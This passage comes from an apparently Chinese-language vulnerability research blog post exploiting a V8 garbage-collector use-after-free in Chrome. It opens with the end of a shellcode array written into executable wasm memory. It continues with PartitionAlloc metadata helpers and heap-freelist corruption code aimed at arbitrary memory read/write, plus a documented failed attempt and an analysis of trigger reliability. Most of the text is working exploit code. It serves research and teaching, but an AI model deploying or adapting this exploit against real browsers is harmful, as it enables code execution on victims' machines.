	<span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span>
	<span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span>
	<span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD6</span>
	<span class="p">]);</span>
	
	<span class="nx">writeN</span><span class="p">(</span><span class="nx">rwx_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
	
	<span class="k">try</span> <span class="p">{</span>
		<span class="nx">wasmFuncA</span><span class="p">();</span>
	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>利用代码基本和 CVE-2019-13720 的相同，除了一些偏移量，主要的修改位于读取 FileReaderLoader 地址的部分，由于 PartitionAlloc 多了一个 ThreadCache 缓存，读取 FileReaderLoader 地址的方法发生了一些变化：</p>
<ul>
  <li>每个线程都有一个独享的 ThreadCache 缓存，内存申请先从 ThreadCache 中查找大小合适的内存块。</li>
  <li>当 ThreadCache 中对应大小的内存块用完时，再去全局的 FastMallocPartitionRoot 申请多个内存块补充到 ThreadCache 中。</li>
</ul>

<p>我只能读到 FastMallocPartitionRoot 的内容，不能确定 ThreadCache 的状态，所以是不能直接得出下一次申请的结果的。但这个问题解决起来也很简单，我多申请几次把当前的 ThreadCache 消耗光就可以了，ThreadCache 消耗光以后，当前 FastMallocPartitionRoot 中记录的下一块内存地址，就会被申请出来插入 ThreadCache 缓存链表的尾部。再次申请多个对象，把 ThreadCache 消耗光，就可以确保这个位于尾部的内存块已经被分配做 FileReaderLoader 了。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// partition allocator meta data</span>

<span class="kd">const</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">superPageBaseMask</span> <span class="o">=</span> <span class="o">~</span><span class="nx">superPageOffsetMask</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">partitionPageIndex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageOffsetMask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">14</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">pageMetadataSize</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">partitionPageMetadataPtr</span> <span class="o">=</span>
      <span class="nx">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">+</span>
      <span class="nx">partitionPageIndex</span> <span class="o">*</span> <span class="nx">pageMetadataSize</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">partitionPageMetadataPtr</span><span class="p">;</span>
<span class="p">}</span>


<span class="kd">function</span> <span class="nx">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">systemPageSize</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">superPageBase</span> <span class="o">+</span> <span class="nx">systemPageSize</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageBaseMask</span><span class="p">;</span> <span class="p">}</span>

</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 类型转换</span>
	
<span class="kd">const</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">f64_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">u64_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">u32_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">ftou</span><span class="p">(</span><span class="nx">f64</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">f64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f64</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">u64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">utof</span><span class="p">(</span><span class="nx">u64</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">u64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u64</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">f64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">high32</span><span class="p">(</span><span class="nx">u64</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">u64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u64</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">u32_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">low32</span><span class="p">(</span><span class="nx">u64</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">u64_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u64</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">u32_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="其他">其他</h2>

<h3 id="影响漏洞触发的因素">影响漏洞触发的因素</h3>

<p>这个漏洞不是必现的，这部分尝试分析影响漏洞复现因素，改进漏洞的稳定性，虽然最后是没找到方案，但是增加了对漏洞的了解。</p>

<p>如果要调试整个标记过程，工作量太大了，而且标记是多线程并行的，不太可行。可以利用 Visual Studio 的条件记录断点（<a href="https://docs.microsoft.com/en-us/visualstudio/debugger/using-tracepoints">tracepoint</a>），在 Ephemeron 标记操作的关键点上记录日志，等标记完成后通过日志分析影响漏洞复现的因素。记录断点速度虽然比手工调试快，但跟无断点执行相比，速度还是要慢很多，也不能设置太多，我只在 <code class="language-plaintext highlighter-rouge">MarkCompactCollector::ProcessEphemerons</code> 和 <code class="language-plaintext highlighter-rouge">MarkingVisitorBase&lt;ConcreteVisitor, MarkingState&gt;::VisitEphemeronHashTable</code> 两个函数中选了几个关键位置，输出遍历 <code class="language-plaintext highlighter-rouge">weak_objects.current_ephemerons</code>、<code class="language-plaintext highlighter-rouge">weak_objects.discovered_ephemerons</code> 和 <code class="language-plaintext highlighter-rouge">EphemeronHashTable</code> 的过程。还要掌握好断点生效的时机，在 MarkRoot 完成后启用断点，在 Ephemeron 处理完成后禁用断点，防止日志中混入不相关的操作。每次收集完日志，可以在 Evacume 之前检查一下 map1 中存储的数据，如果看到仅一个指针所在的内存区域与其他指针不同，就是漏标的对象。</p>

<hr />
<p><strong>ℹ️NOTE</strong>: 被漏标的对象的指针还是指向 New Space 的，其他对象已经被移动到 Old Space ，所以它们指向的内存不在同一个区域。</p>

<hr />

<p>带着日志断点反复执行多次，对比成功和失败的日志后。发现影响漏洞复现的因素是 m7 中 （k7 =&gt; k8），（k8 =&gt; m8） 两项的存储顺序。</p>

<p><code class="language-plaintext highlighter-rouge">MarkingVisitorBase&lt;ConcreteVisitor, MarkingState&gt;::VisitEphemeronHashTable</code> 函数按存储的顺序遍历 m7 中的元素。</p>

<p>如果是先访问 （k8 =&gt; m8）：</p>

<ul>
  <li>此时 k8，m8 都是白色，把 k8 =&gt; m8 加入 <code class="language-plaintext highlighter-rouge">discovered_ephemerons</code> 集合。</li>
  <li>之后访问 （k7 =&gt; k8)，k7 是黑色，k8 是白色，把 k8 标记为灰色，加入工作队列</li>
  <li><code class="language-plaintext highlighter-rouge">VisitEphemeronHashTable</code> 完成，返回到 <code class="language-plaintext highlighter-rouge">DrainMarkingWorklist</code> 继续处理 <code class="language-plaintext highlighter-rouge">worklist</code>，处理完成时 k8 被标记为黑色</li>
  <li>遍历 <code class="language-plaintext highlighter-rouge">discovered_ephemerons</code>，发现 （k8 =&gt; m8），k8 是黑色的，把 m8 标记为灰色，加入 <code class="language-plaintext highlighter-rouge">worklist</code>，满足了循环继续执行的条件。</li>
  <li>新一轮循环开始时，<code class="language-plaintext highlighter-rouge">current_ephemerons</code> 集合中就只剩下 （k9 =&gt; v9）一项，<code class="language-plaintext highlighter-rouge">worklist</code> 中剩下 m8 一项。</li>
  <li>k9 还是白色，<code class="language-plaintext highlighter-rouge">current_ephemerons</code> 没变化</li>
  <li>处理工作队列:
    <ul>
      <li>遍历 m8 的 <code class="language-plaintext highlighter-rouge">EphemeronHashTable</code> 时，发现 （k8 =&gt; k9），k8 为黑色，所以会把 k9 标记为灰色， 加入工作队列。</li>
      <li>从工作队列取出 k9 标记为黑色，工作队列处理完成</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">discovered_ephemerons</code> 集合为空，无需处理。</li>
  <li><code class="language-plaintext highlighter-rouge">current_epehemrons</code> 和 <code class="language-plaintext highlighter-rouge">discovered_ephemerons</code> 两个集合都没变化，循环结束，但其实 v9 还没有被标记。</li>
</ul>

<p>如果是先访问 （k7 =&gt; k8）：</p>

<ul>
  <li>k7 是黑色的，k8 是白色，所以把 k8 标记为灰色，加入 <code class="language-plaintext highlighter-rouge">worklist</code></li>
  <li>再访问 （k8 =&gt; m8），k8 已经被标记为灰色了，m8 是白色，所以会把 m8 标记成灰色，加入 <code class="language-plaintext highlighter-rouge">woklist</code></li>
  <li>返回到 <code class="language-plaintext highlighter-rouge">DrainMarkingWorklist</code>，继续处理 <code class="language-plaintext highlighter-rouge">worklist</code> 直到 <code class="language-plaintext highlighter-rouge">worklist</code>为空，其中比较关键的几个操作：
    <ul>
      <li>处理 k8，把它标记为黑色，内部的 <code class="language-plaintext highlighter-rouge">EphemeronHashTable</code> 标记为灰色加入 <code class="language-plaintext highlighter-rouge">worklist</code></li>
      <li>处理 m8 的 <code class="language-plaintext highlighter-rouge">EphemeronHashTable</code>，发现（k8 =&gt; k9），k8 是黑色，k9 是白色，把 k9 标记为灰色，加入 <code class="language-plaintext highlighter-rouge">worklist</code></li>
      <li>处理 k9，把它标记为黑色</li>
    </ul>
  </li>
  <li>新一轮循环，处理 <code class="language-plaintext highlighter-rouge">current_ephemerons</code>，这个时候集合中只有（k9 =&gt; v9）一项，k9 已经被标记为黑色了，所以这里会把 v9 标记成灰色，加入工作队列。</li>
  <li>继续处理工作队列：把 v9 标记成黑色</li>
  <li>新一轮循环，所有集合都为空无需任何操作，循环结束，存活对象都被正确标记了。</li>
</ul>

<p>分析 JSWeakMap 的内部存储结构，发现它使用的是哈希表，哈希生成函数是 <code class="language-plaintext highlighter-rouge">JSReceiver::CreateIdentityHash</code>，它生成的哈希就是一个伪随机数，那么元素的存储顺序也随机的，我也没找到在插入元素后判断出元素的存储顺序的方法，看来是并不能提升这里的稳定性了。</p>

<p>不过还是有意外收获的，在调试的时候，可以去手动的修改对象的哈希值，增加漏洞复现的概率，从而减少调试工作量。</p>

<hr />
<p><strong>ℹ️NOTE</strong>： 水平所限，我没有分析伪随机数生成算法本身。</p>

<hr />

<h3 id="失败的尝试">失败的尝试</h3>

<p>在成功利用之前我其实还有一次失败的尝试，我觉得也很有必要记录下来，漏洞的分析和利用就是一个不断失败和修正的过程。</p>

<p>利用思路如下：</p>

<ul>
  <li>申请一个 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，触发 GC 把 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 移动到 Old Space</li>
  <li>用 POC 中的方式触发漏洞，但是 v9 要替换成上一步申请的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code></li>
  <li>每次漏洞触发后，要检查一下 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 中存储的值，如果 UAF 成功了，可以读到 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 释放后存储进去的 PartitionAlloc 元数据，如果利用失败，读到的是 0</li>
  <li>漏洞利用成功后，<code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 指向的就是堆的空闲内存链表，下面就可以仿照 CVE-2019-13720 中记录的方案转化成任意内存读写了</li>
</ul>

<p>把 v9 替换成 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 后，利用代码变成：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">setUpWeakMap</span><span class="p">(</span><span class="nx">map</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
	<span class="c1">//gc move o to Old space</span>
	<span class="nx">TrigerGc</span><span class="p">();</span>
	<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">o</span><span class="p">);</span>

	<span class="kd">let</span> <span class="nx">hk</span> <span class="o">=</span> <span class="nx">hideWeakMap</span><span class="p">(</span><span class="nx">map</span><span class="p">,</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">initKey</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">hiddenMap</span> <span class="o">=</span> <span class="nx">map</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hk</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">map7</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">map8</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">k5</span> <span class="o">=</span> <span class="p">{</span><span class="na">k5</span> <span class="p">:</span> <span class="mi">5</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">map5</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">k7</span> <span class="o">=</span> <span class="p">{</span><span class="na">k7</span> <span class="p">:</span> <span class="mi">7</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">k9</span> <span class="o">=</span> <span class="p">{</span><span class="na">k9</span> <span class="p">:</span> <span class="mi">9</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">k8</span> <span class="o">=</span> <span class="p">{</span><span class="na">k8</span> <span class="p">:</span> <span class="mi">8</span><span class="p">};</span>
	<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k7</span><span class="p">,</span> <span class="nx">map7</span><span class="p">);</span>
	<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k9</span><span class="p">,</span> <span class="nx">o</span><span class="p">);</span>
	<span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k5</span><span class="p">,</span> <span class="nx">map5</span><span class="p">);</span>
	<span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hk</span><span class="p">,</span> <span class="nx">k5</span><span class="p">);</span>
	<span class="nx">map5</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hk</span><span class="p">,</span> <span class="nx">k7</span><span class="p">);</span>
	<span class="nx">map7</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k8</span><span class="p">,</span> <span class="nx">map8</span><span class="p">);</span>
	<span class="nx">map7</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k7</span><span class="p">,</span> <span class="nx">k8</span><span class="p">);</span>
	<span class="nx">map8</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k8</span><span class="p">,</span> <span class="nx">k9</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">setUpWeakMap</span><span class="p">(</span><span class="nx">map1</span><span class="p">);</span>

	<span class="nx">TrigerGc</span><span class="p">();</span>

	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">let</span> <span class="nx">hiddenKey</span> <span class="o">=</span> <span class="nx">getHiddenKey</span><span class="p">(</span><span class="nx">map1</span><span class="p">,</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">initKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">hiddenMap</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">k7</span> <span class="o">=</span> <span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">)).</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">k8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">m8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">arrbuf</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">m8</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">));</span>

		<span class="k">try</span> <span class="p">{</span>
			<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">);</span>

			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">arrbuf</span><span class="p">)</span>
				<span class="k">return</span><span class="p">;</span>
				
			<span class="kd">let</span> <span class="nx">maybe_free_entry</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigInt64Array</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">leak_value</span> <span class="o">=</span> <span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
			<span class="k">if</span> <span class="p">(</span><span class="nx">leak_value</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">leak_value</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">alert</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">leak_value</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
			<span class="p">}</span>

		<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">alert</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">lineNumber</span><span class="p">}</span><span class="s2">:</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="p">}</span>

	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div></div>

<hr />
<p><strong>ℹ️NOTE</strong>: Chrome 启用 %DebugPrint 输出：<code class="language-plaintext highlighter-rouge">Chrome.exe --js-flags="--allow-natives-syntax" --no-sandbox --enable-logging=stderr</code></p>

<hr />

<p>这样确实可以读取到堆的元信息，下一步是要修改堆的元信息，使用 <a href="2022-05-10-CVE-2019-13720">CVE-2019-13720</a> 使用的利用技巧，构造出任意内存读写出的能力。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">setUpWeakMap</span><span class="p">(</span><span class="nx">map1</span><span class="p">);</span>

	<span class="nx">TrigerGc</span><span class="p">();</span>

	<span class="k">try</span> <span class="p">{</span>
			<span class="kd">let</span> <span class="nx">hiddenKey</span> <span class="o">=</span> <span class="nx">getHiddenKey</span><span class="p">(</span><span class="nx">map1</span><span class="p">,</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">initKey</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">hiddenMap</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">k7</span> <span class="o">=</span> <span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">)).</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">k8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">m8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">arrbuf</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">m8</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">));</span>

		<span class="k">try</span><span class="p">{</span>
			<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">);</span>
		
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">arrbuf</span><span class="p">)</span>
				<span class="k">return</span><span class="p">;</span>
		
			<span class="kd">let</span> <span class="nx">maybe_free_entry</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">leak_value</span> <span class="o">=</span> <span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
			<span class="k">if</span> <span class="p">(</span><span class="nx">leak_value</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">leak_value</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">next_slot</span> <span class="o">=</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">leak_value</span><span class="p">));</span>
				<span class="nx">meta</span> <span class="o">=</span> <span class="nx">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">next_slot</span><span class="p">);</span>
		
		
				<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">next_slot</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
				<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">meta</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
		
				<span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">meta</span><span class="p">);</span>
				<span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span> <span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
		
				<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
				<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
		
				<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
				<span class="kd">var</span> <span class="nx">keep</span> <span class="o">=</span> <span class="p">[];</span>
				<span class="k">while</span> <span class="p">(</span><span class="nx">maybe_free_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">keep</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x10</span><span class="p">));</span>
				<span class="p">}</span>
		
				<span class="nx">free_list_head</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
				<span class="nx">helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">free_list_head</span><span class="p">);</span>
				
				<span class="nx">helper</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000cccccccc</span><span class="p">;</span>
				<span class="nx">keep</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
				
			<span class="p">}</span>
		<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">alert</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">lineNumber</span><span class="p">}</span><span class="s2">:</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="p">}</span>

	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div></div>

